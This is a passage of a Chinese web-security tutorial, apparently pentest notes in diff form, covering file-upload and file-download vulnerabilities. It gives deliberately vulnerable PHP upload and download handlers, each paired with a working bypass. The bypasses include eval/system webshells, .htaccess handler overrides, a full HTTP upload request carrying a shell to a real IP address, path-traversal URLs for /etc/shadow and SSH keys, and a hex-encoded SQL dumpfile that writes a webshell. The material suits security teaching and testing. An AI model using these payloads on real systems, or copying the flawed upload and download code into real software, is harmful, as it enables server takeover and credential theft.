+- - 上传.htaccess文件。例如webshell名字为1.jpg，上传以下内容。就可以让apache将1.jpg当成php文件处理。
+    &lt;FilesMatch &quot;1.jpg&quot;&gt; 
+        SetHandler application/x-httpd-php 
+    &lt;/FilesMatch&gt;
+- nginx解析漏洞(Nginx&lt;8.03)：当cgi.fix_pathinfo开启时(为1），访问www.xx.com/phpinfo.jpg/1.php,会将phpinfo.jpg当作php解析。
+•配合CMS、编辑器漏洞
+</code></pre>
+
+<h3 id="javascript">客户端javascript校验（通常校验扩展名）</h3>
+<pre><code>
+&lt;?php
+function random_str($length=32){
+
+    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    $password ='';
+for ( $i = 0; $i &lt; $length; $i++ )
+{
+    $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
+}  
+return $password;
+}
+
+if(isset($_FILES[&quot;file&quot;])){
+    if ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 20000)
+    {
+        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)
+        {
+            echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;
+        }
+        else
+        {
+            echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;
+            echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;
+            echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;
+            echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;
+
+            if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))
+            {
+                echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;
+            }
+            else
+            {
+                $random_name=random_str();
+                $filename=$random_name.substr($_FILES[&quot;file&quot;][&quot;name&quot;],strrpos($_FILES[&quot;file&quot;][&quot;name&quot;],'.'),strlen($_FILES[&quot;file&quot;][&quot;name&quot;]));
+
+                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],
+                    &quot;upload/&quot; . $filename);
+                echo &quot;Stored in: &quot; . &quot;upload/&quot; . $filename;
+            }
+        }
+    }
+    else
+    {
+        echo &quot;Invalid file&quot;;
+    }
+}
+?&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+    function checkFileExt()
+    {
+        var flag = false; //状态
+        var arr = [&quot;jpg&quot;,&quot;png&quot;,&quot;gif&quot;];    //检查后缀名
+        var filename='';
+
+        filename=document.getElementById(&quot;file&quot;).value;
+
+        //取出上传文件的扩展名
+        var index = filename.lastIndexOf(&quot;.&quot;);
+        var ext = filename.substr(index+1);
+        //循环比较
+        for(var i=0;i&lt;arr.length;i++)
+        {
+            if(ext == arr[i])
+            {
+                flag = true;
+                break;
+            }
+        }
+        if(flag)
+        {
+            document.getElementById(&quot;form&quot;).submit();
+        }else
+        {
+            alert(&quot;文件名不合法&quot;);
+        }
+    }
+&lt;/script&gt;
+
+&lt;form action=&quot;&quot; method=&quot;post&quot;
+      enctype=&quot;multipart/form-data&quot; id=&quot;form&quot;&gt;
+    &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;
+    &lt;br /&gt;
+    &lt;input type=&quot;button&quot; name=&quot;upload&quot; value=&quot;upload&quot; onclick=&quot;checkFileExt()&quot;/&gt;
+&lt;/form&gt;
+
+&lt;/body&gt;
+&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
+&lt;?php highlight_file(__FILE__);?&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p><strong>Payload：</strong></p>
+<pre><code>1、chrome修改Javascript函数
+2、burpsuite直接发包
+3、菜刀连接不上就用&lt;?php @eval($_REQUEST['c']); ?&gt;使用GET方式请求执行命令。
+</code></pre>
+
+<h3 id="mime">检查MIME类型</h3>
+<pre><code>&lt;?php
+function random_str($length=32){
+
+    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    $password ='';
+for ( $i = 0; $i &lt; $length; $i++ )
+{
+    $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
+}  
+return $password;
+}
+
+// 判断上传类型
+if(isset($_FILES[&quot;file&quot;])){
+    if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)
+            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)
+            || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;))
+        &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 20000))
+    {
+        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)
+        {
+            echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;
+        }
+        else
+        {
+            echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;
+            echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;
+            echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;
+            echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;
+
+            if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))
+            {
+                echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;
+            }
+            else
+            {
+                $random_name=random_str();
+                $filename=$random_name.substr($_FILES[&quot;file&quot;][&quot;name&quot;],strrpos($_FILES[&quot;file&quot;][&quot;name&quot;],'.'),strlen($_FILES[&quot;file&quot;][&quot;name&quot;]));
+
+                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],
+                    &quot;upload/&quot; . $filename);
+                echo &quot;Stored in: &quot; . &quot;upload/&quot; . $filename;
+            }
+        }
+    }
+    else
+    {
+        echo &quot;Invalid file&quot;;
+    }
+}
+?&gt;
+&lt;html&gt;
+&lt;body&gt;
+
+&lt;form action=&quot;&quot; method=&quot;post&quot;
+      enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;
+    &lt;br /&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+&lt;/form&gt;
+
+&lt;/body&gt;
+&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
+&lt;?php highlight_file(__FILE__);?&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p><strong>Payload：</strong></p>
+<pre><code>修改content-type为：image/jpeg
+</code></pre>
+
+<h3 id="1_1">检查文件内容1</h3>
+<p>检查是否为“&lt;?php”</p>
+<pre><code>&lt;?php
+function random_str($length=32){
+
+    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    $password ='';
+    for ( $i = 0; $i &lt; $length; $i++ )
+    {
+        $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
+    }
+    return $password;
+}
+
+if(isset($_FILES[&quot;file&quot;])){
+    if ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 20000)
+    {
+        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)
+        {
+            echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;
+        }
+        else
+        {
+            echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;
+            echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;
+            echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;
+            echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;
+
+            if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))
+            {
+                echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;
+            }
+            else
+            {
+
+                $content=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);
+                if(stripos($content,&quot;&lt;?php&quot;)!==false){  //检查文件内容
+                    die(&quot;you are a hacker! refuse to upload!&quot;);
+                }
+
+                $random_name=random_str();
+                $filename=$random_name.substr($_FILES[&quot;file&quot;][&quot;name&quot;],strrpos($_FILES[&quot;file&quot;][&quot;name&quot;],'.'),strlen($_FILES[&quot;file&quot;][&quot;name&quot;]));
+
+                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],
+                    &quot;upload/&quot; . $filename);
+                echo &quot;Stored in: &quot; . &quot;upload/&quot; . $filename;
+            }
+        }
+    }
+    else
+    {
+        echo &quot;Invalid file&quot;;
+    }
+}
+?&gt;
+&lt;html&gt;
+&lt;body&gt;
+
+&lt;form action=&quot;&quot; method=&quot;post&quot;
+      enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;
+    &lt;br /&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+&lt;/form&gt;
+
+&lt;/body&gt;
+&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
+&lt;?php highlight_file(__FILE__);?&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p><strong>Payload：</strong></p>
+<pre><code>&lt;?=system($_REQUEST['cmd']); ?&gt;
+</code></pre>
+
+<h3 id="2">检查文件内容2</h3>
+<p>检查是否为“&lt;?php”，或者"&lt;?="。</p>
+<pre><code>&lt;?php
+function random_str($length=32){
+
+    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    $password ='';
+    for ( $i = 0; $i &lt; $length; $i++ )
+    {
+        $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
+    }
+    return $password;
+}
+
+if(isset($_FILES[&quot;file&quot;])){
+    if ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 20000)
+    {
+        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)
+        {
+            echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;
+        }
+        else
+        {
+            echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;
+            echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;
+            echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;
+            echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;
+
+            if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))
+            {
+                echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;
+            }
+            else
+            {
+
+                $content=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);
+                //检查文件内容
+                if(stripos($content,&quot;&lt;?php&quot;)!==false or stripos($content,&quot;&lt;?=&quot;)!==false){
+                    die(&quot;you are a hacker! refuse to upload!&quot;);
+                }
+
+                $random_name=random_str();
+                $filename=$random_name.substr($_FILES[&quot;file&quot;][&quot;name&quot;],strrpos($_FILES[&quot;file&quot;][&quot;name&quot;],'.'),strlen($_FILES[&quot;file&quot;][&quot;name&quot;]));
+
+                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],
+                    &quot;upload/&quot; . $filename);
+                echo &quot;Stored in: &quot; . &quot;upload/&quot; . $filename;
+            }
+        }
+    }
+    else
+    {
+        echo &quot;Invalid file&quot;;
+    }
+}
+?&gt;
+&lt;html&gt;
+&lt;body&gt;
+
+&lt;form action=&quot;&quot; method=&quot;post&quot;
+      enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;
+    &lt;br /&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+&lt;/form&gt;
+
+&lt;/body&gt;
+&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
+&lt;?php highlight_file(__FILE__);?&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p><strong>Payload</strong></p>
+<p>使用<code>&lt;script language="php"&gt;标签绕过</code></p>
+<pre><code>&lt;script language=&quot;php&quot;&gt;
+    eval($_REQUEST['cmd']);
+&lt;/script&gt;
+</code></pre>
+
+<h3 id="getimagesize">检查文件内容getimagesize()</h3>
+<p>使用getimagesize()函数判断是否为图片。</p>
+<pre><code>&lt;?php
+function random_str($length=32){
+
+    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    $password ='';
+    for ( $i = 0; $i &lt; $length; $i++ )
+    {
+        $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
+    }
+    return $password;
+}
+
+if(isset($_FILES[&quot;file&quot;])){
+    if ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 200000)
+    {
+        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)
+        {
+            echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;
+        }
+        else
+        {
+
+            if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))
+            {
+                echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;
+            }
+            else
+            {
+                // 检查是否为图片
+                $file_array=getimagesize($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);
+                if($file_array[0]&lt;=0||$file_array[1]&lt;=0)
+                    die(&quot;this is not a real image! abort uploading! &quot;);
+
+                echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;
+                echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;
+                echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;
+                echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;
+
+                $random_name=random_str();
+                $filename=$random_name.substr($_FILES[&quot;file&quot;][&quot;name&quot;],strrpos($_FILES[&quot;file&quot;][&quot;name&quot;],'.'),strlen($_FILES[&quot;file&quot;][&quot;name&quot;]));
+
+                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],
+                    &quot;upload/&quot; . $filename);
+                echo &quot;Stored in: &quot; . &quot;upload/&quot; . $filename;
+            }
+        }
+    }
+    else
+    {
+        echo &quot;Invalid file&quot;;
+    }
+}
+?&gt;
+&lt;html&gt;
+&lt;body&gt;
+
+&lt;form action=&quot;&quot; method=&quot;post&quot;
+      enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;
+    &lt;br /&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+&lt;/form&gt;
+
+&lt;/body&gt;
+&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
+&lt;?php highlight_file(__FILE__);?&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p><strong>测试方法</strong></p>
+<pre><code>上传一个真实图片，然后在图片后面加入php代码。
+
+gif89a 
+...
+&lt;?php eval($_REQUEST['c']);?&gt;
+</code></pre>
+
+<h3 id="-">检查文件后缀-黑名单</h3>
+<p>检查如果是php就无法上传。</p>
+<pre><code>&lt;?php
+function random_str($length=32){
+
+    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    $password ='';
+    for ( $i = 0; $i &lt; $length; $i++ )
+    {
+        $password .= $chars[ mt_rand(0, strlen($chars) - 1) ];
+    }
+    return $password;
+}
+
+if(isset($_FILES[&quot;file&quot;])){
+    if ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 20000)
+    {
+        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)
+        {
+            echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;
+        }
+        else
+        {
+            echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;
+            echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;
+            echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;
+            echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;
+
+            if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))
+            {
+                echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;
+            }
+            else
+            {
+
+                $content=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);
+                if(stripos($content,&quot;&lt;?php&quot;)!==false){
+                    die(&quot;you are a hacker! refuse to upload!&quot;);
+                }
+                //检查文件后缀
+                if($_FILES[&quot;file&quot;][&quot;name&quot;]==&quot;php&quot;){
+                    die(&quot;you cannot upload phpfile!!&quot;);
+                }
+
+                $random_name=random_str();
+                $filename=$random_name.substr($_FILES[&quot;file&quot;][&quot;name&quot;],strrpos($_FILES[&quot;file&quot;][&quot;name&quot;],'.'),strlen($_FILES[&quot;file&quot;][&quot;name&quot;]));
+
+                move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],
+                    &quot;upload/&quot; . $filename);
+                echo &quot;Stored in: &quot; . &quot;upload/&quot; . $filename;
+            }
+        }
+    }
+    else
+    {
+        echo &quot;Invalid file&quot;;
+    }
+}
+?&gt;
+&lt;html&gt;
+&lt;body&gt;
+
+&lt;form action=&quot;&quot; method=&quot;post&quot;
+      enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;
+    &lt;br /&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+&lt;/form&gt;
+
+&lt;/body&gt;
+&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
+&lt;?php highlight_file(__FILE__);?&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p><strong>Payload</strong></p>
+<p>上传php3、php5、phtml、PHP、pHp、phtm后缀文件，组合检测内容的方法上传，HTTP数据包：</p>
+<pre><code>
+
+POST /upload5.php HTTP/1.1
+Host: 202.112.51.134:8081
+Content-Length: 345
+Cache-Control: max-age=0
+Origin: http://202.112.51.134:8081
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNtdg7SskoMrXNXo
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://202.112.51.134:8081/upload5.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: uid=z|1535994035756; UM_distinctid=165a06110a7473-09e856e4fe79bd-47e1039-100200-165a06110a96e; CNZZDATA1261523779=665741857-1535994032-%7C1537339520
+Connection: close
+
+------WebKitFormBoundaryKNtdg7SskoMrXNXo
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;REQUEST.phtml&quot;
+Content-Type: application/octet-stream
+
+&lt;?=system($_REQUEST['cmd']);echo &quot;\r\ntest&quot;?&gt;
+------WebKitFormBoundaryKNtdg7SskoMrXNXo
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+Submit
+------WebKitFormBoundaryKNtdg7SskoMrXNXo--
+
+</code></pre>
+
+<h3 id="-_1">检查后缀漏洞代码-白名单</h3>
+<pre><code>&lt;?php
+#echo $_FILES[&quot;file&quot;][&quot;type&quot;];
+#echo $_FILES[&quot;file&quot;][&quot;size&quot;];
+$st = substr(strrchr($_FILES[&quot;file&quot;][&quot;name&quot;], '.'), 1);
+#echo $st;
+if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)
+|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)
+|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))
+&amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 500000)&amp;&amp; (($st == &quot;gif&quot;)|| ($st==&quot;png&quot;) || ($st==&quot;jpg&quot;)||($st==&quot;php3&quot;)||($st==&quot;php4&quot;))) //检查文件后缀
+  {  
+  if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)
+    {
+    echo &quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;
+    }
+  else
+    {
+    echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;
+    echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;
+    echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;
+    echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br /&gt;&quot;;
+
+    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))
+      {
+      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;
+      }
+    else
+      {
+      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],
+      &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);
+      echo &quot;Stored in: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];
+      }
+    }
+  }
+else
+  {
+  echo &quot;Invalid file&quot;;
+  }
+?&gt;
+</code></pre>
+
+<p><strong>测试方法</strong></p>
+<pre><code>1.创建.htaccess文件，编辑内容为：
+SetHandler application/x-httpd-php
+然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件。
+2.编辑内容为：
+&lt;Files shell.jpg&gt; 
+ForceType application/x-httpd-php 
+SetHandler application/x-httpd-php 
+&lt;/Files&gt;
+
+指定文件名的文件，才能被当做PHP解析。
+</code></pre>
+
+<h2 id="2_1"><strong>2）文件下载</strong></h2>
+<p>由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件。</p>
+<h3 id="_1"><strong>防御文件下载</strong></h3>
+<ul>
+<li>
+<p>过滤.(点)，使用户在url中不能回溯上级目录</p>
+</li>
+<li>
+<p>正则严格判断用户输入参数的格式</p>
+</li>
+<li>
+<p>php.ini配置open_basedir限定文件访问范围</p>
+</li>
+</ul>
+<h3 id="_2"><strong>测试方法</strong></h3>
+<pre><code>download.php?file=../../../../../../../../etc/passwd
+</code></pre>
+
+<ul>
+<li>敏感文件——Windows</li>
+</ul>
+<pre><code>C:\boot.ini //查看系统版本
+C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
+C:\Windows\repair\sam //存储系统初次安装的密码
+C:\ProgramFiles\mysql\my.ini //Mysql配置
+C:\ProgramFiles\mysql\data\mysql\user.MYD //Mysqlroot
+C:\Windows\php.ini //php配置信息
+C:\Windows\my.ini //Mysql配置信息
+</code></pre>
+
+<ul>
+<li>敏感文件——Linux</li>
+</ul>
+<pre><code>/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_ras.keystore
+/root/.ssh/known_hosts
+/etc/passwd
+/etc/shadow
+/etc/my.cnf
+/etc/httpd/conf/httpd.conf
+/root/.bash_history
+/root/.mysql_history
+/proc/self/fd/fd[0-9]*(文件标识符)
+/proc/mounts
+/porc/config.gz
+</code></pre>
+
+<ul>
+<li>常见架构利用-配置信息（java、aspx、asp、php）</li>
+<li>
+<ul>
+<li>Java</li>
+</ul>
+</li>
+</ul>
+<p>1）tomcat-users.xml</p>
+<pre><code>http://www.test.cn/down.jsp?filename=tomcat-users.xml&amp;path=C:/Program%20Files/Apache%20Software%20Foundation/Tomcat%206.0/conf/tomcat-users.xml
+
+从下载到的tomcat-users.xml文件中取得tomcat控制台的登录账号和密码，尝试登录manager/html，上传一个war文件，就可以获得webshell。
+</code></pre>
+
+<p>2）web.xml</p>
+<pre><code>配置文件jsp的配置文件放在根目录WEB-INF/Web.xml下(一般都有很多内容,有时含有数据库连接用户名和密码等关键信息)
+http://test/file.do?method=downFile&amp;fileName=../WEB-INF/Web.xml
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>aspx</li>
+</ul>
+</li>
+</ul>
+<p>1）web.config</p>
+<pre><code>下载web.config文件,获得数据库密码登录数据库，利用sqlserver完成渗透。
+http://www.test.org/DownLoadFileLow.aspx?FileName=../web.config
+http://www.test.org/DownLoadFileLow.aspx?FileName=../../web.config
+</code></pre>
+
+<p>2）下载dll文件</p>
+<pre><code>http://www.test.com.cn/DownLoad.aspx?fileName=../../DownLoad.aspx
+http://www.test.com.cn/DownLoad.aspx?fileName=../../DownLoad.aspx.cs
+DownLoad.aspx对应的源代码是xkcms.webForm.DownLoad，猜解dll文件名。
+http://www.test.com.cn/DownLoad.aspx?fileName=../../bin/xkcms.dll
+http://www.test.com.cn/DownLoad.aspx?fileName=../../bin/webForm.dll
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>asp</li>
+</ul>
+</li>
+</ul>
+<pre><code>1)找到网站与数据库操作的动态页面，动态页面中一般使用include包含连接数据库的配置文件。
+http://www.testcn/GraduateSchool/dlsd/download.asp?filename=../../jianshen/F89A1/inc/conn.asp
+
+2)打开该文件，获取access数据库路径。
+http://www.testcn/jianshen/database/adsfkldfogowerjnokfdslwejhdfsjhk.mdb
+
+3)获取mdb文件
+http://www.testcn/GraduateSchool/dlsd/download.asp?filename=../../jianshen/database/adsfkldfogowerjnokfdslwejhdfsjhk.mdb
+
+4)得到数据库中管理密码，登录后台。
+</code></pre>
+
+<ul>
+<li>
+<ul>
+<li>php</li>
+</ul>
+</li>
+</ul>
+<pre><code>1）下载数据库配置文件，获取数据库密码
+www.test.edu.tw/download.php?filename=../conf/config.php&amp;dir=/&amp;title=config.php
+
+2）思路1：使用phpMyAdmin进行管理，登录后台导出webshell
+select 0x3c3f706870206576616c28245f504f53545b27636d64275d293f3e into dumpfile '/home/webadm/public_html/app/test.php'
+
+3）思路2：远程连接3306端口，操作Mysql
+</code></pre>
+
+<p><strong>文件下载漏洞代码</strong></p>
+<pre><code>&lt;?php
+if (isset($_REQUEST['file'])) {
+    $file='files/' . $_REQUEST['file'];
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer'); //描述页面返回的结果
+        header('Content-Type: application/octet-stream'); //返回内容的类型，此处只知道是二进制流。具体返回类型可参考http://tool.oschina.net/commons
+        header('Content-Disposition: attachment; filename=' . basename($file));//可以让浏览器弹出下载窗口
+        header('Content-Transfer-Encoding: binary');//内容编码方式，直接二进制，不要gzip压缩
+        header('Expires: 0');//过期时间
+        header('Cache-Control: must-revalidate');//缓存策略，强制页面不缓存，作用与no-cache相同，但更严格，强制意味更明显
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));//文件大小，在文件超过2G的时候，filesize()返回的结果可能不正确
+
+        $content = file_get_contents($file);
+        echo $content;
+    } else {
+        die(&quot;this file does not exist!&quot;);
+    }
+
+} else {
+    echo '&lt;a href=&quot;download.php?file=1.jpg&quot;&gt;下载图片&lt;/a&gt;';
+}
+?&gt;
+&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;
+&lt;?php highlight_file(__FILE__);?&gt;
+</code></pre>
+
+<p><strong>测试方法</strong></p>
